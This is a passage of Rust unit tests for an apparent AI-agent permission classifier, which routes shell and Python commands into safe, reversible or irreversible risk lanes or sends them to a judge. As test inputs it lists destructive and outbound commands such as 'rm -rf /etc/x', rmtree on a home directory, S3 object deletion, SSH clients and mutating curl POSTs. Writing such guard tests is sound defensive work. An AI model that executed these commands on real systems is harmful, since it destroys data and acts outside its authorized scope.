        // Location is a signal, not a wall: out-of-workspace READS (and append
        // redirects, which are edits) stay Safe in the fallback.
        for cmd in [
            "python script.py /etc/config",
            "echo note >> /tmp/notes.txt",
        ] {
            assert_eq!(fb_bash(cmd).lane, RiskLane::Safe, "{cmd}");
        }
    }

    #[test]
    fn fallback_python_destruction_splits_on_literals() {
        use SideEffectCategory::OutOfWorkspaceDestruction;
        // An escaping string literal alongside a destruction call → ask.
        for code in [
            "import shutil; shutil.rmtree('/home/user/dir')",
            "from pathlib import Path; Path('~/x').unlink()",
            "import os; os.remove(\"../secret\")",
        ] {
            let c = fb_python(code);
            assert_eq!(c.lane, RiskLane::IrreversibleDanger, "{code}");
            assert_eq!(c.category, Some(OutOfWorkspaceDestruction), "{code}");
        }
        // Relative-only literals → checkpoint lane.
        for code in [
            "import os; os.remove('data/tmp/x.csv')",
            "import shutil; shutil.move('data/a', 'data/b')",
        ] {
            assert_eq!(fb_python(code).lane, RiskLane::ReversibleDanger, "{code}");
        }
        // No destruction call at all → Safe (pure compute).
        assert_eq!(fb_python("print('/etc/hosts')").lane, RiskLane::Safe);
    }

    #[test]
    fn permission_summary_describes_the_risk() {
        let s = permission_summary(
            tn::RUN_BASH,
            &json!({ "command": "curl -X POST https://x" }),
        );
        assert!(s.contains("mutating HTTP"), "summary was: {s}");
        // A Python outbound write is the ExternalApi category — same HTTP phrasing.
        let s = permission_summary(tn::RUN_PYTHON, &json!({ "code": "requests.post(u)" }));
        assert!(s.contains("mutating HTTP"), "summary was: {s}");
    }

    // --- Safe-list evasion regressions (permission-audit findings) ----------

    #[test]
    fn curl_json_and_other_body_flags_are_mutating() {
        // `--json` (curl ≥7.82) implies POST; `--data-ascii` / `--form-string`
        // are body flags too. None of these are GETs — they must reach the
        // judge, and the static fallback must tag them ExternalApi.
        for cmd in [
            "curl --json '{\"a\":1}' https://api.example.com/charge",
            "curl --json='{\"a\":1}' https://api.example.com/charge",
            "curl --data-ascii 'x=1' https://api.example.com/pay",
            "curl --form-string 'f=v' https://api.example.com/upload",
        ] {
            assert_needs_judge(bash(cmd), cmd);
            assert_eq!(
                static_side_effect_category(cmd),
                Some(SideEffectCategory::ExternalApi),
                "{cmd}"
            );
        }
    }

    #[test]
    fn fd_duplication_does_not_break_segmentation() {
        // `2>&1` / `>&2` are pure fd plumbing — they must not split the line
        // into junk segments that defeat the safe fast-path.
        for cmd in [
            "ls -la 2>&1",
            "grep x data/f 2>&1 | head -5",
            "echo done >&2",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
        // Stripping the fd-dup must not mask a real file redirect next to it.
        assert_needs_judge(bash("ls 2>&1 > /etc/out"), "redirect after fd-dup");
    }

    #[test]
    fn variable_paths_are_not_trusted_as_in_workspace() {
        // A `$VAR` path can resolve anywhere — never settled Safe; the judge
        // reads the actual command.
        for cmd in [
            "echo x > $TMPDIR/y",
            "mkdir -p ${OUT_DIR}/cache",
            "touch data/$RUN_ID/marker",
            "curl -o $CACHE_DIR/f https://x/d",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    #[test]
    fn python_sdk_and_renamed_client_side_effects_go_to_judge() {
        // Cloud SDKs, remote-exec libs, and renamed HTTP clients must hit the
        // judge — the old module-qualified list (`requests.post(` …) missed
        // every one of these.
        for code in [
            "import boto3; boto3.client('s3').delete_object(Bucket='b', Key='k')",
            "import paramiko; c = paramiko.SSHClient()",
            "from ftplib import FTP",
            "from google.cloud import storage",
            "s = requests.Session(); s.post(url, json=d)",
            "client.delete(f'/items/{i}')",
        ] {
            assert_needs_judge(python(code), code);
        }
    }

    #[test]
    fn segment_heads_lists_every_command_in_a_chain() {
        assert_eq!(
            segment_heads("sudo /usr/bin/aws s3 rm x && curl -X POST u; git push"),
            vec!["aws".to_string(), "curl".to_string(), "git".to_string()]
        );
        assert_eq!(segment_heads("ls -la 2>&1"), vec!["ls".to_string()]);
        assert!(segment_heads("").is_empty());
        assert!(segment_heads("2>/dev/null").is_empty());
    }

    // --- Static side-effect category (trigger grant key + fallback summary) ---

    #[test]
    fn static_side_effect_category_maps_each_kind() {
        use SideEffectCategory::*;
        assert_eq!(
            static_side_effect_category("curl -X POST https://api/charge"),
            Some(ExternalApi)
        );
        assert_eq!(
            static_side_effect_category("wget --post-data='x=1' https://api/pay"),
            Some(ExternalApi)
        );
        assert_eq!(
            static_side_effect_category("echo body | mail -s subj a@b.com"),
            Some(Email)
        );
        assert_eq!(
            static_side_effect_category("osascript -e 'tell application \"Mail\" to send'"),
            Some(Email)
        );
        assert_eq!(
            static_side_effect_category("gh pr create --fill"),
            Some(CloudCli)
        );
        assert_eq!(
            static_side_effect_category("aws s3 rm s3://b/k"),
            Some(CloudCli)
        );
        // Python shapes.
        assert_eq!(
            static_side_effect_category("import requests; requests.post(u)"),
            Some(ExternalApi)
        );
        assert_eq!(
            static_side_effect_category("import smtplib; smtplib.SMTP('x')"),
            Some(Email)
        );
        // A plain GET / unknown command has no static category.
        assert_eq!(static_side_effect_category("curl https://x"), None);
        assert_eq!(static_side_effect_category("npm install"), None);
        // Out-of-workspace destruction is judge-only — never static.
        assert_eq!(static_side_effect_category("rm -rf /etc/x"), None);
    }
}
